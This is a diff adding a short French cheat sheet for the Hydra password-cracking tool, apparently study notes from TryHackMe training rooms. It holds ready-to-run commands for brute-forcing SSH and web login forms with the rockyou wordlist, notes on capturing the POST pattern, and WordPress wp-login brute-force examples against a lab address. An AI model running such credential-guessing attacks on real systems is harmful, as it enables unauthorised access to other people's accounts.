@@ -1,0 +1,28 @@
+--->HYDRA 
+
+--> Pour ssh :
+hydra -l <username> -P Desktop/rockyou.txt $ip ssh -V -I
+
+
+--> Pour http web form :
+hydra -l <username> -P ../rockyou.txt $ip http-post-form "/:username=^USER^&password=^PASS^:F=<msg si login/mdp faux>" -V -I -t 64
+
+-> "/ indique le chemin ou se trouve le web form
+Dans les "", il faut y mettre le paterne de la requete POST avec au moins le username, le password :F=<msg si login/mdp faux>
+Le paterne peut se trouver en analysant la requete post envoyé au serveur via la page network du Develloper Tool.
+
+-> F=<...> indique ce que renvoie le serveur quand c'est incorrect, il s'agit d'une chaîne de caractère immuable et sans balise !
+
+/!\
+-> -l username -P wordlist crack le password
+-> -L wordlist -p password crack le username
+
+Exemples :
+
+hydra -L fsocity.dic -p test $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.5.9%2Fwp-admin%2F&testcookie=1:F=Invalid username." -V -I -t 64
+
+hydra -l Elliot -P rockyou.txt $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.5.9%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username Elliot is incorrect." -V -I -t 64
+
+~~~
+
+https://tryhackme.com/room/hydra
